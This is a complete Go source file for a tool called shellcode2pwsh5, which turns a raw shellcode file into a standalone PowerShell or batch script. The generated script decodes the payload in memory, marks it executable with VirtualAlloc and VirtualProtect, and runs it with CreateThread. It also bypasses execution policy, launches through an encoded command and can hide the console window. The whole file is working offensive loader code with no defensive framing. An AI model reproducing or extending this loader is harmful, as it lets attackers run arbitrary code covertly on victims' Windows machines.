// shellcode2pwsh5 - pack a binary payload into a self-contained Windows script.
//
// The generated script (.ps1 / .bat / .cmd) carries the payload as base64,
// decodes it in memory and executes it with a RW -> RX protection scheme.
// Runtime target: Windows PowerShell 5.1 (powershell.exe).
//
// Layout of a generated .bat/.cmd file:
//
//	[5 cmd lines]       launch powershell.exe with a base64-encoded loader
//	exit /b             cmd stops here; everything below is PowerShell data
//	#__B2P_CORE__       core marker; the loader executes the file from here
//	$B2P_* variables    payload metadata, then the in-memory runner
//
// A generated .ps1 file is just the PowerShell core (no cmd wrapper).
//
// With --hidden the cmd header passes -WindowStyle Hidden to powershell.exe
// (which hides the shared console before the core even starts) and the core
// additionally hides its own console window right before executing the
// payload, so a .ps1 launched from a visible terminal is covered too.
//
// The templates are embedded in this file as raw string constants, so the
// compiled binary is fully standalone. No third-party dependencies.
package main

import (
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"flag"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"unicode/utf16"
)

// version is stamped at build time:
//
//	go build -ldflags "-X main.version=1.2.3" .
var version = "1.0.0"

const (
	progName  = "shellcode2pwsh5"
	marker    = "#__B2P_CORE__"
	b64Width  = 120
	largeWarn = 50 * 1024 * 1024
)

type archSpec struct {
	is64 bool
	hint string
}

var archInfo = map[string]archSpec{
	"x64": {is64: true, hint: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`},
	"x86": {is64: false, hint: `C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`},
}

// coreTpl is the PowerShell core: metadata variables, integrity check and
// the RW -> RX in-memory runner. Placeholders are replaced by the generator.
const coreTpl = `@MARKER@
@META@
$ErrorActionPreference = 'Stop'
if ([Environment]::Is64BitProcess -ne @ARCH64@) {
    [Console]::Error.WriteLine('B2P: architecture mismatch - payload is @ARCHNAME@, current PowerShell is ' + $(if ([Environment]::Is64BitProcess) {'64-bit'} else {'32-bit'}) + '. Use: @ARCH_HINT@')
    exit 3
}
$b64 = @'
@B64@
'@
try {
    $sc = [Convert]::FromBase64String(($b64 -replace '\s',''))
} catch {
    [Console]::Error.WriteLine('B2P: invalid base64 payload (file modified or truncated?)')
    exit 2
}
@VERIFY@
try {
    Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public static class B2P
{
    [DllImport("kernel32", SetLastError = true)] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32", SetLastError = true)] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32", SetLastError = true)] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
    [DllImport("kernel32", SetLastError = true)] public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
    [DllImport("kernel32", SetLastError = true)] public static extern bool GetExitCodeThread(IntPtr hThread, out uint lpExitCode);
@CONSOLE_PINVOKE@}
'@
} catch {
    [Console]::Error.WriteLine('B2P: Add-Type failed (requires .NET Framework): ' + $_.Exception.Message)
    exit 4
}
@HIDE@$size = [UIntPtr]::new([uint32]$sc.Length)
$addr = [B2P]::VirtualAlloc([IntPtr]::Zero, $size, 0x3000, 0x04)
if ($addr -eq [IntPtr]::Zero) {
    [Console]::Error.WriteLine('B2P: VirtualAlloc failed (win32 error ' + [Runtime.InteropServices.Marshal]::GetLastWin32Error() + ')')
    exit 4
}
[Runtime.InteropServices.Marshal]::Copy($sc, 0, $addr, $sc.Length)
$old = [uint32]0
if (-not [B2P]::VirtualProtect($addr, $size, 0x20, [ref]$old)) {
    [Console]::Error.WriteLine('B2P: VirtualProtect failed (RW -> RX)')
    exit 4
}
$tid = [uint32]0
$h = [B2P]::CreateThread([IntPtr]::Zero, [UIntPtr]::Zero, $addr, [IntPtr]::Zero, 0, [ref]$tid)
if ($h -eq [IntPtr]::Zero) {
    [Console]::Error.WriteLine('B2P: CreateThread failed')
    exit 4
}
[void][B2P]::WaitForSingleObject($h, [uint32]::MaxValue)
$ec = [uint32]0
[void][B2P]::GetExitCodeThread($h, [ref]$ec)
exit ([int]$ec)
`

// headTpl is the cmd wrapper for .bat/.cmd outputs. It hands control to
// powershell.exe and stops before the PowerShell part of the file.
const headTpl = `@echo off
setlocal
set "B2P_SELF=%~f0"
set "B2P_PS=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
@X86FALLBACK@
"%B2P_PS%" -NoProfile -ExecutionPolicy Bypass@WINDOWSTYLE@ -EncodedCommand @ENC@
exit /b %ERRORLEVEL%
`

func die(msg string, code int) {
	fmt.Fprintf(os.Stderr, "%s: error: %s\n", progName, msg)
	os.Exit(code)
}

func usage() {
	out := flag.CommandLine.Output()
	fmt.Fprintf(out, "%s %s - pack a binary payload into a self-contained Windows script (.ps1/.bat/.cmd)\n", progName, version)
	fmt.Fprint(out, `
Usage:
  shellcode2pwsh5 -i <payload.bin> -f <ps1|bat|cmd> [options]

Options:
  -i, --input  <path>   input binary file (required)
  -f, --format <fmt>    output format: ps1 | bat | cmd (required)
  -o, --output <path>   output file or directory (default: .\<input>.<fmt>)
  -t, --type   <type>   payload type (default "shellcode")
  -a, --arch   <arch>   target architecture: x64 | x86 (default "x64")
      --verify          run a SHA-256 integrity self-check before execution
      --hidden          hide the console window while the payload runs
      --force           overwrite an existing output file
      --version         print version and exit
  -h, --help            show this help

Examples:
  shellcode2pwsh5 -i payload.bin -f bat
  shellcode2pwsh5 -i payload.bin -f ps1 -o out\loader.ps1 --verify
  shellcode2pwsh5 -i payload.bin -f bat --hidden

Notes on --hidden:
  For .bat/.cmd the window disappears as soon as powershell.exe starts. For .ps1
  the core hides its own console right before the payload runs. Console error
  messages (exit codes 2/3/4) are then not visible, so use --hidden only for
  unattended runs. If you start a .ps1 from your own terminal, that terminal
  window is hidden too, because the script inherits its console.

Generated script exit codes: payload exit code passes through; container
errors: 2 = payload data or marker damaged, 3 = architecture mismatch,
4 = memory API failure.
`)
}

// buildLoader returns the short PowerShell loader that is passed to
// powershell.exe via -EncodedCommand by the cmd wrapper. It reads the script
// file itself, locates the core marker and executes everything from there.
func buildLoader() string {
	return "if(-not $env:B2P_SELF){[Console]::Error.WriteLine('B2P: B2P_SELF is not set');exit 2};" +
		"try{$t=[IO.File]::ReadAllText($env:B2P_SELF)}catch{[Console]::Error.WriteLine('B2P: cannot read script file');exit 2};" +
		"$i=$t.IndexOf('" + marker + "');" +
		"if($i -lt 0){[Console]::Error.WriteLine('B2P: core marker not found (file modified or truncated)');exit 2};" +
		"iex $t.Substring($i)"
}

// encodeLoader encodes the loader for -EncodedCommand: base64 of UTF-16LE.
func encodeLoader() string {
	units := utf16.Encode([]rune(buildLoader()))
	buf := make([]byte, 0, len(units)*2)
	for _, u := range units {
		buf = append(buf, byte(u), byte(u>>8))
	}
	return base64.StdEncoding.EncodeToString(buf)
}

func wrapB64(data []byte) string {
	b64 := base64.StdEncoding.EncodeToString(data)
	var sb strings.Builder
	for i := 0; i < len(b64); i += b64Width {
		end := i + b64Width
		if end > len(b64) {
			end = len(b64)
		}
		sb.WriteString(b64[i:end])
		sb.WriteByte('\n')
	}
	return strings.TrimRight(sb.String(), "\n")
}

func buildCore(payloadType, arch string, payload []byte, sha string, verify, hidden bool) (string, error) {
	info := archInfo[arch]
	meta := fmt.Sprintf("$B2P_TYPE='%s';$B2P_ARCH='%s';$B2P_SIZE=%d\n$B2P_SHA256='%s'",
		payloadType, arch, len(payload), sha)

	text := coreTpl
	if verify {
		verifyBlock := "if ($sc.Length -ne $B2P_SIZE) { [Console]::Error.WriteLine('B2P: integrity check failed (size mismatch)'); exit 2 }\n" +
			"$hs = [BitConverter]::ToString([System.Security.Cryptography.SHA256]::Create().ComputeHash($sc)).Replace('-','').ToLowerInvariant()\n" +
			"if ($hs -ne $B2P_SHA256) { [Console]::Error.WriteLine('B2P: integrity check failed (sha256 mismatch - file modified?)'); exit 2 }"
		text = strings.Replace(text, "@VERIFY@\n", verifyBlock+"\n", 1)
	} else {
		text = strings.Replace(text, "@VERIFY@\n", "", 1)
	}

	// Console-window P/Invokes, only emitted when the window must be hidden.
	// Note: GetConsoleWindow lives in kernel32, ShowWindow in user32.
	consolePinvoke := ""
	if hidden {
		consolePinvoke = "    [DllImport(\"kernel32\", SetLastError = true)] public static extern IntPtr GetConsoleWindow();\n" +
			"    [DllImport(\"user32\", SetLastError = true)] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n"
	}
	text = strings.Replace(text, "@CONSOLE_PINVOKE@", consolePinvoke, 1)

	// Hide the console just before running the payload, so that integrity and
	// architecture errors stay visible on screen.
	hideBlock := ""
	if hidden {
		hideBlock = "$hWnd = [B2P]::GetConsoleWindow()\n" +
			"if ($hWnd -ne [IntPtr]::Zero) { [void][B2P]::ShowWindow($hWnd, 0) }\n"
	}
	text = strings.Replace(text, "@HIDE@", hideBlock, 1)

	arch64 := "$false"
	if info.is64 {
		arch64 = "$true"
	}
	replacements := [][2]string{
		{"@MARKER@", marker},
		{"@META@", meta},
		{"@ARCH64@", arch64},
		{"@ARCHNAME@", arch},
		{"@ARCH_HINT@", info.hint},
		{"@B64@", wrapB64(payload)},
	}
	for _, kv := range replacements {
		text = strings.ReplaceAll(text, kv[0], kv[1])
	}
	for _, kv := range replacements {
		if strings.Contains(text, kv[0]) {
			return "", fmt.Errorf("internal error: template placeholder %s was not replaced", kv[0])
		}
	}
	for _, ph := range []string{"@VERIFY@", "@HIDE@", "@CONSOLE_PINVOKE@"} {
		if strings.Contains(text, ph) {
			return "", fmt.Errorf("internal error: template placeholder %s was not replaced", ph)
		}
	}
	return text, nil
}

func buildHead(arch, enc string, hidden bool) (string, error) {
	fallback := ""
	if !archInfo[arch].is64 {
		fallback = `if exist "%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe" set "B2P_PS=%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"`
	}
	text := strings.ReplaceAll(headTpl, "@X86FALLBACK@", fallback)
	text = strings.ReplaceAll(text, "@ENC@", enc)
	// -WindowStyle Hidden hides the console that powershell.exe shares with the
	// cmd wrapper, i.e. the window the user would otherwise see.
	windowStyle := ""
	if hidden {
		windowStyle = " -WindowStyle Hidden"
	}
	text = strings.ReplaceAll(text, "@WINDOWSTYLE@", windowStyle)
	if strings.Contains(text, "@X86FALLBACK@") || strings.Contains(text, "@ENC@") ||
		strings.Contains(text, "@WINDOWSTYLE@") {
		return "", fmt.Errorf("internal error: head template placeholders were not replaced")
	}
	return text, nil
}

// writeScript writes the output as pure ASCII, CRLF line endings, no BOM,
// using a temp file + rename so the target is never half-written.
func writeScript(path, text string) error {
	for i := 0; i < len(text); i++ {
		if text[i] > 0x7F {
			return fmt.Errorf("output contains a non-ASCII byte at offset %d; templates must stay pure ASCII", i)
		}
	}
	data := []byte(strings.ReplaceAll(text, "\n", "\r\n"))
	tmp := path + ".tmp"
	if err := os.WriteFile(tmp, data, 0o644); err != nil {
		return err
	}
	return os.Rename(tmp, path)
}

func resolveOutput(inputPath, format, output string) string {
	base := strings.TrimSuffix(filepath.Base(inputPath), filepath.Ext(inputPath))
	defaultName := base + "." + format
	if output == "" {
		return defaultName
	}
	if strings.HasSuffix(output, "/") || strings.HasSuffix(output, "\\") {
		return filepath.Join(output, defaultName)
	}
	if st, err := os.Stat(output); err == nil && st.IsDir() {
		return filepath.Join(output, defaultName)
	}
	got := strings.ToLower(filepath.Ext(output))
	expected := "." + format
	sameFamily := (format == "bat" || format == "cmd") && (got == ".bat" || got == ".cmd")
	if got != expected && !sameFamily {
		shown := got
		if shown == "" {
			shown = "(none)"
		}
		fmt.Fprintf(os.Stderr, "%s: warning: -o extension %s does not match format %s (writing anyway)\n",
			progName, shown, format)
	}
	return output
}

func main() {
	flag.Usage = usage

	var (
		input       string
		format      string
		output      string
		payloadType string
		arch        string
		verify      bool
		hidden      bool
		force       bool
		showVersion bool
	)

	flag.StringVar(&input, "i", "", "input binary file")
	flag.StringVar(&input, "input", "", "input binary file")
	flag.StringVar(&format, "f", "", "output format: ps1 | bat | cmd")
	flag.StringVar(&format, "format", "", "output format: ps1 | bat | cmd")
	flag.StringVar(&output, "o", "", "output file or directory")
	flag.StringVar(&output, "output", "", "output file or directory")
	flag.StringVar(&payloadType, "t", "shellcode", "payload type")
	flag.StringVar(&payloadType, "type", "shellcode", "payload type")
	flag.StringVar(&arch, "a", "x64", "target architecture: x64 | x86")
	flag.StringVar(&arch, "arch", "x64", "target architecture: x64 | x86")
	flag.BoolVar(&verify, "verify", false, "run a SHA-256 integrity self-check before execution")
	flag.BoolVar(&hidden, "hidden", false, "hide the console window while the payload runs")
	flag.BoolVar(&force, "force", false, "overwrite an existing output file")
	flag.BoolVar(&showVersion, "version", false, "print version and exit")
	flag.Parse()

	if showVersion {
		fmt.Printf("%s %s\n", progName, version)
		return
	}

	if input == "" {
		die("missing required option -i/--input (see -h for usage)", 1)
	}
	if format == "" {
		die("missing required option -f/--format, expected ps1 | bat | cmd (see -h for usage)", 1)
	}
	format = strings.ToLower(format)
	payloadType = strings.ToLower(payloadType)
	arch = strings.ToLower(arch)

	switch format {
	case "ps1", "bat", "cmd":
	default:
		die(fmt.Sprintf("unknown format %q, expected ps1, bat or cmd", format), 1)
	}
	if payloadType != "shellcode" {
		die(fmt.Sprintf("type %q is not implemented yet (v1 supports shellcode only; dotnet/pe are planned)", payloadType), 1)
	}
	if _, ok := archInfo[arch]; !ok {
		die(fmt.Sprintf("unknown architecture %q, expected x64 or x86", arch), 1)
	}

	st, err := os.Stat(input)
	if err != nil || st.IsDir() {
		die("input file not found: "+input, 1)
	}
	payload, err := os.ReadFile(input)
	if err != nil {
		die("cannot read input file: "+err.Error(), 1)
	}
	if len(payload) == 0 {
		die("input file is empty: "+input, 1)
	}
	if len(payload) > largeWarn {
		fmt.Fprintf(os.Stderr, "%s: warning: payload is %.1f MB; scripts larger than 50 MB become slow to parse and run\n",
			progName, float64(len(payload))/(1024*1024))
	}

	outPath := resolveOutput(input, format, output)
	if !force {
		if _, err := os.Stat(outPath); err == nil {
			die("output file exists (use --force to overwrite): "+outPath, 1)
		}
	}

	sum := sha256.Sum256(payload)
	sha := hex.EncodeToString(sum[:])

	core, err := buildCore(payloadType, arch, payload, sha, verify, hidden)
	if err != nil {
		die(err.Error(), 1)
	}
	text := core
	if format != "ps1" {
		head, err := buildHead(arch, encodeLoader(), hidden)
		if err != nil {
			die(err.Error(), 1)
		}
		text = head + core
	}

	if err := os.MkdirAll(filepath.Dir(outPath), 0o755); err != nil {
		die("cannot create output directory: "+err.Error(), 1)
	}
	if err := writeScript(outPath, text); err != nil {
		die(err.Error(), 1)
	}

	outSize := int64(0)
	if ost, err := os.Stat(outPath); err == nil {
		outSize = ost.Size()
	}
	verifyState := "off"
	if verify {
		verifyState = "on"
	}
	hiddenState := "off"
	if hidden {
		hiddenState = "on"
	}
	fmt.Printf("%s: wrote %s\n", progName, outPath)
	fmt.Printf("  format : %s   type: %s   arch: %s\n", format, payloadType, arch)
	fmt.Printf("  payload: %d bytes   sha256 %s\n", len(payload), sha)
	fmt.Printf("  output : %d bytes   verify: %s   hidden: %s\n", outSize, verifyState, hiddenState)
	if hidden {
		fmt.Printf("  note   : console window is hidden while the payload runs; container errors (2/3/4) will not be visible\n")
	}
}
